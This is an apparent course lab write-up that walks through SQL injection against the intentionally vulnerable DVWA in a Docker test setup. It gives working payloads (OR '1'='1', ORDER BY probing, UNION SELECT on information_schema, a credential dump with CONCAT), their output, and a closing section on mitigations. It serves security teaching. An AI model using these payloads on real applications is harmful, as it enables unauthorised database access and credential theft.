@@ -1,0 +1,479 @@
+================================================================
+PRACTICAL 6: SQL Injection (Test Environment)
+Tools Used: DVWA, OWASP ZAP, Kali Linux, Docker
+================================================================
+
+AIM:
+To perform SQL Injection attacks on DVWA (Damn Vulnerable Web 
+Application) in a controlled test environment, extract database 
+information including usernames and password hashes, and 
+understand mitigation techniques.
+
+================================================================
+BRIEF THEORY
+================================================================
+
+SQL Injection:
+A web security vulnerability where an attacker inserts malicious
+SQL code into an input field. The database executes it, allowing
+the attacker to bypass authentication, extract data, or 
+manipulate the database entirely.
+Falls under A03: Injection in OWASP Top 10 (2021).
+
+DVWA (Damn Vulnerable Web Application):
+An intentionally vulnerable PHP/MySQL web application used for
+security training. Has adjustable security levels (Low, Medium,
+High, Impossible) making it ideal for learning SQL injection
+step by step.
+
+UNION Attack:
+A SQL injection technique that appends a second SELECT query
+to the original one, allowing extraction of data from other
+tables in the database.
+
+information_schema:
+A built-in MySQL database that stores metadata — information
+about all other databases, tables, and columns on the server.
+Attackers use it to map the entire database structure.
+
+MD5 Hash:
+A one-way encryption function. Passwords are stored as MD5
+hashes in databases. Example: "password" in MD5 is
+5f4dcc3b5aa765d61d8327deb882cf99
+
+Docker:
+Runs pre-built application containers. Used here to instantly
+deploy DVWA without manual PHP/MySQL installation.
+
+ZAP (Zed Attack Proxy):
+Intercepts all HTTP traffic between browser and web app.
+Acts as proxy on port 8081 (since 8080 is used by DVWA).
+Logs every request and response for analysis.
+
+================================================================
+STEP BY STEP PROCEDURE
+================================================================
+
+--- PHASE 1: FRESH KALI SETUP ---
+
+STEP 1: Open Terminal
+- Boot Kali Linux in VMware
+- Right click on desktop
+- Click "Open Terminal"
+- You will see prompt: (kali@kali)-[~]$
+
+STEP 2: Update Package List
+Type and press Enter:
+
+    sudo apt update
+
+- sudo = run as administrator
+- apt update = refresh available software list
+- Enter password when asked
+- Wait for "Reading package lists... Done"
+
+STEP 3: Install Docker
+Type and press Enter:
+
+    sudo apt install -y docker.io
+
+- docker.io = Docker software package
+- -y = auto confirm all prompts
+- Wait until terminal prompt $ returns (2-3 minutes)
+
+STEP 4: Start Docker Service
+Type and press Enter:
+
+    sudo systemctl start docker
+
+- systemctl start = turn on the background service
+- No output = success
+
+--- PHASE 2: DEPLOYING DVWA ---
+
+STEP 5: Run DVWA using Docker
+Type and press Enter:
+
+    sudo docker run -d -p 8080:80 vulnerables/web-dvwa
+
+- docker run = download and launch container
+- -d = run in background, keeps terminal free
+- -p 8080:80 = your Kali port 8080 maps to DVWA's port 80
+- vulnerables/web-dvwa = official pre-built DVWA image
+- First time: downloads image (3-5 minutes), wait for $ prompt
+- You will see many "Pull complete" lines = normal
+
+--- PHASE 3: SETTING UP ZAP ---
+
+STEP 6: Install ZAP
+Type and press Enter:
+
+    sudo apt install -y zaproxy
+
+- zaproxy = OWASP ZAP package name in Kali
+- Takes 2-3 minutes
+
+STEP 7: Launch ZAP
+Type and press Enter:
+
+    zaproxy &
+
+- & = runs ZAP in background, terminal stays usable
+- Wait 30-60 seconds for ZAP window to open
+
+STEP 8: Handle ZAP Popups
+First popup - Session persistence:
+- Select "No, I do not want to persist this session" (already selected)
+- Click Start
+
+Second popup - Port conflict error:
+- ZAP shows "Unable to use port 8080"
+- This is because DVWA is already using port 8080
+- ZAP suggests port 8081 instead
+- Click Yes
+- ZAP now runs its proxy on port 8081
+- Bottom of ZAP shows: "Main Proxy: localhost:8081"
+
+If Manage Add-ons window opens:
+- Click the X to close it
+- Not needed for our practical
+
+--- PHASE 4: CONNECTING ZAP TO DVWA ---
+
+STEP 9: Open DVWA Through ZAP
+- In ZAP window click "Manual Explore" (middle button)
+- In URL field type:
+
+    http://localhost:8080
+
+- Click "Launch Browser"
+- A new Firefox browser opens already connected through ZAP
+- DVWA login page appears at localhost:8080/login.php
+
+--- PHASE 5: SETTING UP DVWA ---
+
+STEP 10: Login to DVWA
+- Username field: admin
+- Password field: password
+- Click Login
+- You are taken to Database Setup page
+
+STEP 11: Create Database
+- You will see "Database Setup" page with Setup Check
+- Scroll to the bottom of the page
+- Click "Create / Reset Database" button
+- Page redirects back to login automatically
+- Login again: admin / password
+- You are now on DVWA home page
+- Bottom shows: "You have logged in as 'admin'"
+- Security Level: low (this is what we need)
+
+STEP 12: Verify Security Level is Low
+- In left sidebar click "DVWA Security"
+- Dropdown should show "Low"
+- If not, select "Low" from dropdown and click Submit
+- Low security = no input filtering = vulnerable to injection
+
+STEP 13: Go to SQL Injection Page
+- In left sidebar click "SQL Injection"
+- Page shows "Vulnerability: SQL Injection"
+- There is a "User ID" input field with Submit button
+- This is where all attacks will be performed
+
+================================================================
+SQL INJECTION ATTACKS
+================================================================
+
+--- ATTACK 1: Normal Input Test ---
+
+STEP 14: Test Normal Behaviour
+In User ID field type:
+
+    1
+
+Click Submit
+
+Result: Shows real user data
+    ID: 1
+    First name: admin
+    Surname: admin
+
+What this does: Confirms the field queries the database
+normally. The app runs: SELECT * FROM users WHERE id='1'
+SCREENSHOT THIS.
+
+--- ATTACK 2: Confirm Vulnerability ---
+
+STEP 15: Break the SQL Query
+In User ID field type:
+
+    '
+
+Click Submit
+
+Result: MySQL error appears:
+"You have an error in your SQL syntax... near ''' at line 1"
+
+What this does: The single quote breaks the SQL query syntax.
+The fact that the database error is shown to the user confirms:
+1. The input is passed directly to the database unsanitized
+2. The application is vulnerable to SQL injection
+SCREENSHOT THIS ERROR.
+
+--- ATTACK 3: Extract All Users ---
+
+STEP 16: Dump All User Records
+In User ID field type:
+
+    1' OR '1'='1
+
+Click Submit
+
+Result: All users in database are displayed at once
+
+What this does: The query becomes:
+SELECT * FROM users WHERE id='1' OR '1'='1'
+Since '1'='1' is always true, all rows are returned.
+SCREENSHOT THIS.
+
+--- ATTACK 4: Find Number of Columns ---
+
+STEP 17: Test Column Count
+In User ID field type:
+
+    1' ORDER BY 1#
+
+Click Submit - shows normal result (1 column exists)
+
+Then type:
+
+    1' ORDER BY 2#
+
+Click Submit - shows normal result (2 columns exist)
+
+Then type:
+
+    1' ORDER BY 3#
+
+Click Submit - shows error: "Unknown column '3' in order clause"
+
+What this does: ORDER BY sorts by column number. When we go
+beyond the actual number of columns it throws an error.
+Error on 3 = table has exactly 2 columns.
+# at end = comments out rest of original query
+SCREENSHOT ALL THREE RESULTS.
+
+--- ATTACK 5: Find Visible Columns ---
+
+STEP 18: UNION Test
+In User ID field type:
+
+    ' UNION SELECT 1,2#
+
+Click Submit
+
+Result: Shows numbers 1 and 2 on screen
+
+What this does: UNION joins a second SELECT query to the
+original. Seeing 1 and 2 displayed confirms both columns
+are visible in the output. We can now inject real data
+in place of these numbers.
+SCREENSHOT THIS.
+
+--- ATTACK 6: Extract Database Name ---
+
+STEP 19: Get Current Database Name
+In User ID field type:
+
+    ' UNION SELECT database(),2#
+
+Click Submit
+
+Result: Shows "dvwa" as the First name output
+
+What this does: database() is a MySQL function that returns
+the name of the currently selected database.
+Replaces the 1 in UNION SELECT with actual function output.
+SCREENSHOT THIS.
+
+--- ATTACK 7: Extract All Table Names ---
+
+STEP 20: List All Tables in Database
+In User ID field type:
+
+    ' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()#
+
+Click Submit
+
+Result: Shows all table names:
+    guestbook
+    users
+
+What this does: 
+- information_schema.tables = MySQL's built-in table that
+  stores names of all tables across all databases
+- table_schema=database() = filter to only show tables from
+  the current database (dvwa)
+- We can now see the database structure
+SCREENSHOT THIS.
+
+--- ATTACK 8: Extract Column Names ---
+
+STEP 21: List All Columns in Users Table
+In User ID field type:
+
+    ' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'#
+
+Click Submit
+
+Result: Shows all column names:
+    user_id
+    first_name
+    last_name
+    user
+    password
+    avatar
+    last_login
+    failed_login
+
+What this does:
+- information_schema.columns = stores column names of all tables
+- WHERE table_name='users' = filter to only users table
+- Now we know exactly which columns hold the data we want
+SCREENSHOT THIS.
+
+--- ATTACK 9: Extract Usernames and Passwords ---
+
+STEP 22: Dump All Credentials
+In User ID field type:
+
+    ' UNION SELECT user,password FROM users#
+
+Click Submit
+
+Result: Shows all usernames with their MD5 password hashes:
+    admin : 5f4dcc3b5aa765d61d8327deb882cf99
+    gordonb : e99a18c428cb38d5f260853678922e03
+    1337 : 8d3533d75ae2c3966d7e0d4fcc69216b
+    pablo : 0d107d09f5bbe40cade3de5c71e9e9b7
+    smithy : 5f4dcc3b5aa765d61d8327deb882cf99
+
+What this does: Directly selects user and password columns
+from the users table. Passwords are stored as MD5 hashes.
+SCREENSHOT THIS - MOST IMPORTANT SCREENSHOT.
+
+--- ATTACK 10: Display Combined Output ---
+
+STEP 23: Extract Credentials in Combined Format
+In User ID field type:
+
+    ' UNION SELECT user,CONCAT(user,0x3a,password) FROM users#
+
+Click Submit
+
+Result: Shows username:passwordhash format for every user:
+    admin:5f4dcc3b5aa765d61d8327deb882cf99
+    gordonb:e99a18c428cb38d5f260853678922e03
+    1337:8d3533d75ae2c3966d7e0d4fcc69216b
+    pablo:0d107d09f5bbe40cade3de5c71e9e9b7
+    smithy:5f4dcc3b5aa765d61d8327deb882cf99
+
+What this does:
+- CONCAT() = joins multiple values into one string
+- 0x3a = hexadecimal for colon character (:)
+- Combines username and password hash in one readable line
+SCREENSHOT THIS.
+
+--- VERIFY IN ZAP ---
+
+STEP 24: Check ZAP History Tab
+- Switch to ZAP window (click it in Kali taskbar)
+- Click "History" tab at the bottom panel
+- You will see every GET request made during attacks
+- Each request shows the injection payload in the URL
+- Click on the password extraction request
+- Click "Request" tab on right panel
+- You can see the full SQL injection payload
+- Click "Response" tab to see the server's full response
+SCREENSHOT ZAP HISTORY TAB.
+
+================================================================
+RESULT
+================================================================
+
+Successfully performed the following SQL Injection attacks
+on DVWA at Security Level Low:
+
+Attack 1  - Normal input test: confirmed database query works
+Attack 2  - Single quote: triggered MySQL error, confirmed 
+            vulnerability exists
+Attack 3  - OR 1=1: extracted all user records from database
+Attack 4  - ORDER BY: determined table has exactly 2 columns
+Attack 5  - UNION SELECT 1,2: confirmed both columns visible
+Attack 6  - database(): extracted database name "dvwa"
+Attack 7  - information_schema.tables: extracted all table 
+            names (guestbook, users)
+Attack 8  - information_schema.columns: extracted all column 
+            names from users table
+Attack 9  - UNION SELECT user,password: extracted all 
+            usernames and MD5 password hashes
+Attack 10 - CONCAT: displayed credentials in combined format
+
+All HTTP requests were captured and logged by OWASP ZAP
+confirming the complete attack chain.
+
+================================================================
+MITIGATION
+================================================================
+
+1. Parameterized Queries / Prepared Statements (Most Important)
+   Instead of:
+   SELECT * FROM users WHERE id='$input'
+   
+   Use:
+   SELECT * FROM users WHERE id=?
+   Then pass input separately so it is never treated as SQL code
+
+2. Input Validation
+   Reject inputs containing SQL special characters like
+   single quotes, UNION, SELECT, DROP etc.
+
+3. Least Privilege Database Accounts
+   The web app's database user should only have SELECT 
+   permission — not access to information_schema or ability
+   to DROP/ALTER tables
+
+4. Error Handling
+   Never display raw database errors to users. Use generic
+   error messages instead so attackers cannot read SQL syntax
+
+5. Web Application Firewall (WAF)
+   Detects and blocks common SQL injection patterns before
+   they reach the database
+
+================================================================
+CONCLUSION
+================================================================
+
+DVWA provided a safe and controlled environment to perform
+a complete SQL injection attack chain — from confirming
+vulnerability to extracting actual usernames and MD5 hashed
+passwords from the database. 
+
+The attack progressed logically: confirm injection point,
+determine column count, use UNION to extract database name,
+map table and column structure via information_schema, and
+finally dump all credentials from the users table.
+
+OWASP ZAP captured the entire attack chain in its History tab,
+providing HTTP-level evidence of each injection payload and
+server response.
+
+SQL Injection remains one of the most critical vulnerabilities
+classified under A03: Injection in the OWASP Top 10 (2021).
+Proper use of parameterized queries completely eliminates
+this vulnerability class.
+
+================================================================
+END OF PRACTICAL 6
+================================================================
